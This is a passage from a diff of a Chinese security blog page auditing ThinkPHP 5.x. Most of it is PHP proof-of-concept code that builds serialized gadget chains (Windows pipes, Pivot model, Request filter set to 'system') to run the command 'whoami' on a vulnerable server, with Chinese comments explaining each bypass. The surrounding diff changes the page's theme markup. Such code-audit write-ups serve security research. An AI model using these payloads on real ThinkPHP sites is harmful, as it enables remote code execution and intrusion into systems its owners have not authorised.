language_">$this</span>-&gt;relation = <span class="variable">$relation</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;visible = <span class="variable">$visible</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = <span class="variable">$withAttr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$relation</span>=[],<span class="variable">$visible</span>=[],<span class="variable">$data</span>=[],<span class="variable">$withAttr</span>=[]</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$relation</span>,<span class="variable">$visible</span>,<span class="variable">$data</span>,<span class="variable">$withAttr</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">relation</span> = <span class="title class_">array</span>(&quot;<span class="title class_">system</span>&quot;=&gt;1);</span><br><span class="line">    <span class="variable">$visible</span> = <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>=&gt;<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>=&gt;<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="variable">$withAttr</span> = <span class="keyword">array</span>(<span class="string">&quot;system&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);</span><br><span class="line">    <span class="variable">$pivot</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$relation</span>,<span class="variable">$visible</span>,<span class="variable">$data</span>,<span class="variable">$withAttr</span>);</span><br><span class="line">    <span class="variable">$windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="keyword">array</span>(<span class="variable">$pivot</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace think;
+abstract class Model&#123;
+    protected $append = [];
+    private $data = [];
+    function __construct()&#123;
+        $this-&gt;append = [&quot;poc&quot;=&gt;[&quot; &quot;,&quot; &quot;]];
+        $this-&gt;data = [&quot;poc&quot;=&gt;new Request()];
+    &#125;
+&#125;
+class Request
+&#123;
+    protected $hook = [];
 
-<p><img src="/../images/image-20240708142049120.png" alt="image-20240708142049120"></p>
+    protected $filter = &quot;system&quot;;
+    protected $mergeParam=true;
+    protected $param = [];
+    protected $config = [
+        // 表单请求类型伪装变量
+        &#39;var_method&#39;       =&gt; &#39;_method&#39;,
+        // 表单ajax伪装变量
+        &#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,
+        // 表单pjax伪装变量
+        &#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,
+        // PATHINFO变量名 用于兼容模式
+        &#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,
+        // 兼容PATH_INFO获取
+        &#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],
+        // 默认全局过滤方法 用逗号分隔多个
+        &#39;default_filter&#39;   =&gt; &#39;&#39;,
+        // 域名根，如thinkphp.cn
+        &#39;url_domain_root&#39;  =&gt; &#39;&#39;,
+        // HTTPS代理标识
+        &#39;https_agent_name&#39; =&gt; &#39;&#39;,
+        // IP代理获取标识
+        &#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,
+        // URL伪静态后缀
+        &#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,
+    ];
+    function __construct()&#123;
+        $this-&gt;filter = &quot;system&quot;;//回调时调用的PHP函数
+        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#39;&#39;];//在isAjax方法传递给param方法的$name绕过param方法的一些操作，但主要是为了绕过input方法里面对$data的改变
+        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];//在__call里面调用isAjax
+        $this-&gt;mergeParam=true;//绕过param方法里的一些操作
+        $this-&gt;param=[&quot;whoami&quot;,&quot;&quot;];//input方法的$data,也是即将执行的命令
+    &#125;
+&#125;
+namespace think\process\pipes;
 
-        </div>
+use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+&#123;
+    private $files = [];
 
-        
-            <section class="post-copyright">
-                
-                
-                
-                
+    public function __construct()
+    &#123;
+        $this-&gt;files=[new Pivot()];
+    &#125;
+&#125;
+namespace think\model;
 
-            </section>
-        
-        <section class="post-tags">
-            <div>
-                <span>Tag(s):</span>
-                <span class="tag">
-                    
-                    
-                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"># 代码审计</a>
-                    
-                        
-                </span>
-            </div>
-            <div>
-                <a href="javascript:window.history.back();">back</a>
-                <span>· </span>
-                <a href="/">home</a>
-            </div>
-        </section>
-        <section class="post-nav">
-            
-                <a class="prev" rel="prev" href="/2024/07/08/ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/">ThinkPHP5.0.X反序列化利用链</a>
-            
-            
-            <a class="next" rel="next" href="/2024/07/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%89/">ThinkPHP5代码审计:代码执行(三)</a>
-            
-        </section>
+use think\Model;
 
+class Pivot extends Model
+&#123;
+&#125;
+use think\process\pipes\Windows;
+echo urlencode(serialize(new Windows()));
+?&gt;&lt;?php
+namespace think\process\pipes&#123;
+    class Windows
+    &#123;
+        private $files = [];
 
-    </article>
+        public function __construct($files=[])
+        &#123;
+            $this-&gt;files = $files;
+        &#125;
+    &#125;
+&#125;
+
+namespace think\model\concern&#123;
+    trait Conversion
+    &#123;
+        protected $visible = [];
+        protected $relation = [];
+    &#125;
+    trait Attribute
+    &#123;
+        private $data = [];
+        private $withAttr = [];
+    &#125;
+&#125;
+
+namespace think&#123;
+    use think\model\concern\Conversion;
+    use think\model\concern\Attribute;
+    abstract class Model
+    &#123;
+        use Conversion;
+        use Attribute;
+
+        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])
+        &#123;
+            $this-&gt;relation = $relation;
+            $this-&gt;visible = $visible;
+            $this-&gt;data = $data;
+            $this-&gt;withAttr = $withAttr;
+        &#125;
+    &#125;
+&#125;
+
+namespace think\model&#123;
+    use think\Model;
+    class Pivot extends Model&#123;
+        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])
+        &#123;
+            parent::__construct($relation,$visible,$data,$withAttr);
+        &#125;
+    &#125;
+&#125;
+
+namespace&#123;
+    $relation = array(&quot;system&quot;=&gt;1);
+    $visible = array(&quot;system&quot;=&gt;1);
+    $data = array(&quot;system&quot;=&gt;&quot;whoami&quot;);
+    $withAttr = array(&quot;system&quot;=&gt;&quot;system&quot;);
+    $pivot = new think\model\Pivot($relation,$visible,$data,$withAttr);
+    $windows = new think\process\pipes\Windows(array($pivot));
+    echo urlencode(serialize($windows));
+&#125;
+</code></pre>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822658.png" alt="image-20240708142049120"></p>
+
+    </div>
+</article>
+
+<div id="paginator">
+    
 </div>
 
-            </div>
-            <footer id="footer" class="footer">
-    <div class="copyright">
-        <span>© p0l1st | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-</footer>
+</div>
 
+<div id="bottom-outer">
+    <div id="bottom-inner">
+        2019-2024 p0l1st 皖ICP备16011445号
     </div>
+</div>
+
+<div id="to-top">
+    <i class="iconfont icon-up"></i>
+</div>
+
+
+    
+        <script src="http://example.com/js/jquery-3.4.1.min.js"></script>
+    
+        <script src="http://example.com/js/highlight-9.13.1.min.js"></script>
+    
+        <script src="http://example.com/js/transition.js"></script>
+    
+        <script src="http://example.com/js/smooth-scroll.min.js"></script>
+    
+
+
+
+    <script>
+      $(function () {
+        $('#banner-outer').addClass('fade-out')
+        $('#menu-outer').addClass('fade-show')
+
+        $('pre').each(function (i, block) {
+          hljs.highlightBlock(block);
+        });
+      })
+    </script>
+
+
+<script>
+  $(function () {
+    $(window).scroll(function () {
+      if ($(window).scrollTop() > 150) {
+        $("#to-top").fadeIn();
+      } else {
+        $("#to-top").fadeOut();
+      }
+    });
+    $("#to-top").click(function () {
+      $("body,html").animate({scrollTop: 0}, 500);
+      return false;
+    })
+  })
+</script>
 </body>
-
 </html>
